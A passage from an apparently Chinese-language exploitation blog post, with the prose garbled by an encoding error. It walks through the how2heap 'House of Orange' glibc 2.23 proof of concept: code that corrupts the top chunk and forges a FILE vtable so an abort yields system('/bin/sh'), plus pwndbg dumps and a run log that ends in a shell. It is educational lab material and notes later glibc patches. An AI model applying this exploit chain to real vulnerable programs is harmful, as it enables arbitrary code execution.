set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ç¬¬ä¸€æ¬¡brkçš„å †å—å¤§å°éƒ½æ˜¯0x21000ï¼Œ</p><p>é¦–å…ˆæ¨¡æ‹Ÿäº†ä»»æ„å¤§å°çš„å †æº¢å‡ºï¼Œå‰é¢ä¸€ç›´åˆ°<code>p2 = malloc(0x1000);</code>å’Œæˆ‘ä»¬ä¸Šé¢åˆ†æçš„ä¸€æ ·åœ¨åˆ¶é€ unsorted bin</p><p><img src="/2023/04/06/House-of-orange/image-20230407001924067.png" alt="image-20230407001924067"></p><p>è¿™0x1000çš„chunkè¢«åˆ†é…åˆ°æ–°brkçš„topchunkä¸Š</p><p><img src="/2023/04/06/House-of-orange/image-20230407002211084.png" alt="image-20230407002211084"></p><p><code>  io_list_all = top[2] + 0x9a8;</code>æ ¹æ®unsortedbinçš„å›ºå®šåç§»å®šä½åˆ°_io_list_all&#x3D;<strong>0x7ffff7dd2520</strong></p><p><img src="/2023/04/06/House-of-orange/image-20230407002519360.png" alt="image-20230407002519360"></p><p><code>  top[3] = io_list_all - 0x10;    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);    top[1] = 0x61;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230407002923144.png" alt="image-20230407002923144"></p><p>å…¶ä½™ç›´æ¥ä»<code>malloc(0x10)</code>å¾€åæ¨å§</p><p>æŠŠ0x602400æ‹¿èµ°æ—¶ä¼šchunk-&gt;bk-&gt;fd&#x3D;unsortedbinï¼Œæˆ‘ä»¬ä¼šå¾€io_list_allå†™å…¥unsortedbin</p><p><strong>0x61æ˜¯ä¸ªé‡ç‚¹</strong></p><ul><li><p>malloc(0x10)æ—¶ä¼šå…ˆæŠŠè¿™ä¸ª0x61å¤§å°çš„chunkæ”¾å…¥0x60å¤§å°çš„smallbiné‡Œå³main_arena+0xc0ï¼Œç„¶ååˆ‡å‰²ä»–çš„bkæ‰€æŒ‡çš„chunk</p><p><img src="/2023/04/06/House-of-orange/image-20230407012803059.png" alt="image-20230407012803059"></p></li><li><p>è¿™ä¸ªæ—¶å€™io_list_allé‡Œæ˜¯main_arena+88,æˆ‘ä»¬æŠŠå®ƒå½“ä½œIO_FILE_plusç»“æ„ä½“ï¼Œä»–çš„_chainæŒ‡é’ˆåœ¨main_arena+88+0x68&#x3D;main_arena+0xc0å¤„ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ª0x60smallbiné‡Œå­˜çš„åœ°å€</p><p><img src="/2023/04/06/House-of-orange/image-20230407012846958.png" alt="image-20230407012846958"></p></li><li><p>ä¹Ÿå°±æ˜¯è¯´io_list_allé“¾è¡¨çš„ä¸‹ä¸€ä¸ªé“¾è¡¨æ˜¯0x602400ï¼Œä»–çš„å‘¨å›´éƒ½æ˜¯æ˜¯æˆ‘ä»¬çš„å¯æ§èŒƒå›´</p><p><img src="/2023/04/06/House-of-orange/image-20230407012952664.png" alt="image-20230407012952664"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€‰æ‹©ä¸€å—å¯æ§å†…å­˜ä¼ªé€ vtableï¼Œå¹¶è¦†ç›–å†™å…¥ä»–çš„_overflowæŒ‡é’ˆ</p></li><li><p>åˆ‡å‰²bkæ—¶ç”±äºbkä¸ç¬¦åˆè¦æ±‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šè§¦å‘<code>malloc_printerr</code>,ä¸€ç›´åˆ°_overflow</p><p><code>__libc_malloc</code> &#x3D;&gt; <code>malloc_printerr</code> &#x3D;&gt; <code>__libc_message</code> &#x3D;&gt; <code>abort</code> &#x3D;&gt; <code>fflush</code>&#x3D;&gt;<code>_IO_flush_all_lockp</code>&#x3D;&gt;<code>_IO_OVERFLOW</code></p><p>_IO_flush_all_lockpé‡Œéœ€è¦ç»•è¿‡ä¸€äº› å…·ä½“å‚è€ƒFSOP _IO_OVERFLOWä¼šä»¥_IO_FILE_plusä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨å‰é¢ç”¨memcpy( ( char *) top, â€œ&#x2F;bin&#x2F;sh\x00â€, 8)æŠŠä»–çš„å¼€å¤´èµ‹å€¼ä¸ºsystemæ‰€éœ€çš„å‚æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus*)<span class="number">0x602400</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">1852400175</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, </span><br><span class="line">    _IO_read_end = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7ffff7dd1bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x2</span> &lt;error: Cannot access memory at address <span class="number">0x2</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x3</span> &lt;error: Cannot access memory at address <span class="number">0x3</span>&gt;, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">4196319</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x0</span>, </span><br><span class="line">    _offset = <span class="number">0</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x602460</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_jump_t*)<span class="number">0x602460</span>                                                                                                                                                                       </span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  __dummy = <span class="number">0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0</span>, </span><br><span class="line">  __finish = <span class="number">0x0</span>, </span><br><span class="line">  __overflow = <span class="number">0x4007df</span> &lt;winner&gt;, </span><br><span class="line">  __underflow = <span class="number">0x0</span>, </span><br><span class="line">  __uflow = <span class="number">0x0</span>, </span><br><span class="line">  __pbackfail = <span class="number">0x0</span>, </span><br><span class="line">  __xsputn = <span class="number">0x0</span>, </span><br><span class="line">  __xsgetn = <span class="number">0x0</span>, </span><br><span class="line">  __seekoff = <span class="number">0x0</span>, </span><br><span class="line">  __seekpos = <span class="number">0x0</span>, </span><br><span class="line">  __setbuf = <span class="number">0x0</span>, </span><br><span class="line">  __sync = <span class="number">0x0</span>, </span><br><span class="line">  __doallocate = <span class="number">0x0</span>, </span><br><span class="line">  __read = <span class="number">0x0</span>, </span><br><span class="line">  __write = <span class="number">0x602460</span>, </span><br><span class="line">  __seek = <span class="number">0x0</span>, </span><br><span class="line">  __close = <span class="number">0x0</span>, </span><br><span class="line">  __stat = <span class="number">0x0</span>, </span><br><span class="line">  __showmanyc = <span class="number">0x0</span>, </span><br><span class="line">  __imbue = <span class="number">0x0</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure></li></ul><p>malloc fail ä½†æ‹¿åˆ°shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2.23&gt; ./house_of_orange </span><br><span class="line">The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><br><span class="line">Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><br><span class="line">*** Error in `./house_of_orange&#x27;: malloc(): memory corruption: 0x00007ffff7dd2520 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7ffff7a847f5]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7ffff7a8f15e]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a911d4]</span><br><span class="line">./house_of_orange[0x4007d8]</span><br><span class="line">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d840]</span><br><span class="line">./house_of_orange[0x4005d9]</span><br><span class="line">======= Memory map: ========</span><br><span class="line">00400000-00401000 r-xp 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00600000-00601000 r--p 00000000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00601000-00602000 rw-p 00001000 00:2f 82                                 /mnt/hgfs/Share/how2heap/glibc_2.23/house_of_orange</span><br><span class="line">00602000-00645000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 790524                     /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 791392                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7fdc000-7ffff7fdf000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 791384                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h3 id="æˆåŠŸç‡"><a href="#æˆåŠŸç‡" class="headerlink" title="æˆåŠŸç‡"></a>æˆåŠŸç‡</h3><p>houseoforangeæˆåŠŸç‡åªæœ‰%50</p><p>_IO_flush_all_lockpå‡½æ•°ï¼Œä¼šæ ¹æ®_IO_list_allå’Œchainå­—æ®µæ¥å»ä¾æ¬¡éå†é“¾è¡¨ä¸Šçš„æ¯ä¸ªç»“æ„ä½“ï¼Œç¬¬ä¸€ä¸ªç»“æ„ä½“æ˜¯main_arena+88 main_arena+88+0xc0æ˜¯_modeå­—æ®µ</p><p>è¿™ä¸ªå­—æ®µæ˜¯libcéšæœºçš„ï¼Œ0åˆ°0xffffffffä¹‹é—´çš„ä»»æ„å€¼ï¼Œä½†æ˜¯å¦‚æœå¤§äº0x7fffffffçš„è¯è¯¥å€¼å°±ä¸ºè´Ÿ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>æ­£æ•°<code>(fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>ä¸€å®šæˆç«‹ï¼Œä¼šéå†ä»–çš„vtableï¼Œç”±äºä»–çš„vtableæˆ‘ä»¬æ²¡æœ‰æ§åˆ¶ï¼Œæœ€ç»ˆè°ƒç”¨å‡½æ•°å‡ºå·®</p><p>æ‰€ä»¥è´Ÿæ•°æ‰è¡Œ<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>æ˜¯ç›¸ç­‰çš„</p>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FSOP</title>
      <link href="/2023/04/06/FSOP/"/>
      <url>/2023/04/06/FSOP/</url>
      
